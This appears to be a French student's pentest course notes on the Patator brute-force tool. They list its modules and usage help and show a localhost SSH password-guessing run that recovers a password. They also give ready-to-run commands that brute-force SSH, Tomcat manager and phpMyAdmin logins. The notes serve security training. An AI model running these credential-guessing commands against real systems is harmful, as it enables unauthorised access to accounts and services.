.pentest
[[Readme (outils)]]

Pour tester la force des mots de passe (catégorie : Bruteforce)
script python mis au point par Sébastien Macke, capable de bruteforcer un peu tout et n’importe
quoi, que ce soit SSH, SMTP, MySQL, VNC et même les fichiers zip et les DNS (c’est à dire pour
débusquer certains sous-domaines inconnus). Il suffit d’utiliser le bon module :
• ftp_login : Brute-force FTP
• ssh_login : Brute-force SSH
• telnet_login : Brute-force Telnet
• smtp_login : Brute-force SMTP
• smtp_vrfy : Enumerate valid users using the SMTP VRFY command
• smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command
• http_fuzz : Brute-force HTTP/HTTPS
• pop_passd : Brute-force poppassd (not POP3)
• ldap_login : Brute-force LDAP
• smb_login : Brute-force SMB
• mssql_login : Brute-force MSSQL
• oracle_login : Brute-force Oracle
• mysql_login : Brute-force MySQL
• pgsql_login : Brute-force PostgreSQL
• vnc_login : Brute-force VNC
• dns_forward : Forward lookup subdomains
• dns_reverse : Reverse lookup subnets
• snmp_login : Brute-force SNMPv1/2 and SNMPv3
• unzip_pass : Brute-force the password of encrypted ZIP files
• keystore_pass : Brute-force the password of Java keystore files
Pour bruteforcer, il faut :
• D'un dictionnaire
• Python
• Patator
https://www.frameip.com/dictionnaire/
https://github.com/lanjelot/patator
Utilisation (ssh) :
python3 patator.py ssh_login
Patator 1.0 (https://github.com/lanjelot/patator) with python-3.9.2
Usage: ssh_login <module-options ...> [global-options ...]
Examples:
 ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
Module options:
 host : target host
 port : target port [22]
 user : usernames to test
 password : passwords to test
 auth_type : type of password authentication to use [password|keyboard-interactive|auto]
 keyfile : file with RSA, DSA, ECDSA or ED25519 private key to test
 persistent : use persistent connections [1|0]
 [pierre@parrot] [~/SupDeVinci/pentest/patator]
 $python3 patator.py ssh_login host=127.0.0.1 user=tom password=FILE0 0=~/Téléchargements/francais-villes.txt -x
ignore:mesg='Authentication failed.'
11:43:41 patator INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.9.2 at 2023-11-14 11:43 CET
11:43:41 patator INFO -
11:43:41 patator INFO - code size time | candidate | num | mesg
11:43:41 patator INFO - -----------------------------------------------------------------------------
11:43:53 patator INFO - 0 38 0.031 | marseille | 42 | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u2
11:43:59 patator INFO - Hits/Done/Skip/Fail/Size: 1/61/0/0/61, Avg: 3 r/s, Time: 0h 0m 17s
Utilisation (http) :
Patator 1.0 (https://github.com/lanjelot/patator) with python-3.9.2
Usage: http_fuzz <module-options ...> [global-options ...]
Examples:
 http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
Patator
mardi 14 novembre 2023 10:57
 Pentest Page 1
 http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
 http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
 http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0
=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
Module options:
 url : target url (scheme://host[:port]/path?query)
 body : body data
 header : use custom headers
 method : method to use [GET|POST|HEAD|...]
 raw_request : load request from file
 scheme : scheme [http|https]
 auto_urlencode: automatically perform URL-encoding [1|0]
 pathasis : retain sequences of /../ or /./ [0|1]
 user_pass : username and password for HTTP authentication (user:pass)
 auth_type : type of HTTP authentication [basic | digest | ntlm]
 follow : follow any Location redirect [0|1]
 max_follow : redirection limit [5]
 accept_cookie : save received cookies to issue them in future requests [0|1]
 proxy : proxy to use (host:port)
 proxy_type : proxy type [http|socks4|socks4a|socks5]
 resolve : hostname to IP address resolution to use (hostname:IP)
 ssl_cert : client SSL certificate file (cert+key in PEM format)
 timeout_tcp : seconds to wait for a TCP handshake [10]
 timeout : seconds to wait for a HTTP response [20]
 before_urls : comma-separated URLs to query before the main request
 before_header : use a custom header in the before_urls request
 before_egrep : extract data from the before_urls response to place in the main request
 after_urls : comma-separated URLs to query after the main request
 max_mem : store no more than N bytes of request+response data in memory [-1 (unlimited)]
 persistent : use persistent connections [1|0]
 Pentest Page 2 